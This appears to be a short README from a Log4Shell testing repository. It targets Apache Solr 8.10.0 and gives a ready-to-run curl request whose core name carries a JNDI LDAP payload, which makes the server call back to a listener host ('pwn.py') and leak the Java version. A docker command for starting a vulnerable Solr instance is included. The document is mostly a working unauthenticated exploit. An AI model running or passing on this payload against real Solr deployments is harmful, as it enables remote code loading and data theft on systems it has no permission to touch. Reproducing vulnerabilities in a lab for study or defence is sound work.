# apache solr

- Version: `8.10.0`
- Auth required: No

## details

Can be triggered by configuring a new core, naming it the log4j payload.

This cURL request should do (where `host` is where [pwn.py](../../../pwn.py) is running with the `-k` flag):

```bash
curl 'http://localhost:8983/solr/admin/cores?_=1639544088432&action=CREATE&config=solrconfig.xml&dataDir=data&instanceDir=new_core&name=$%7Bjndi:ldap:%2F%2Fhost:5456%2F$%7Bjava:version%7D%7D&schema=schema.xml&wt=json'
```

## run

```bash
docker run --rm --name solr -p 8983:8983 solr:8.10.0
```

## example

![1](images/1.png)
